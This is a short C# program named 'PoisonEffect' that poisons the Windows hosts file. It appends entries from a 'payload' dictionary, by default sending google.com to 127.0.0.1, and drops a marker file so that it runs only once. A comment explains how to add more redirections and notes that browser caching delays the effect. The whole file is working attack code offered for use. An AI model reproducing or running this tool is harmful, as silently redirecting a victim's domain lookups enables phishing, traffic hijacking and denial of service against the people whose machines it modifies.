using System;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;

namespace PoisonEffect
{
    class Program
    {
        static void Main(string[] args)
        {
            Directory.SetCurrentDirectory(@"C:\Windows\System32\drivers\etc");

            if (File.Exists("hosts_tmp")) { Environment.Exit(0); }

            /*

                This is the payload dictionary, here is an example:

                {"google.com", "127.0.0.1"}

                That piece of code will make the program modify
                the hosts file so that every request to google.com is
                actually going to 127.0.0.1, do keep in mind that the
                second string NEEDS to be an IP address, also keep
                in mind that your browser is quite smart, so it will 
                save the website in cache for some time, making so
                the effect of this program is delayed.

            */

            Dictionary<string, string> payload = new Dictionary<string, string>()
            {
                // payloads start here
                {"google.com", "127.0.0.1"}
            };


            using (StreamWriter hostModifier = File.AppendText("hosts"))
            {
                hostModifier.WriteLine("\n");
                foreach (KeyValuePair<string, string> item in payload)
                {
                    hostModifier.WriteLine($"{item.Value}    {item.Key}");
                }
                hostModifier.Close();
            }
            File.Create("hosts_tmp");

        }
    }
}
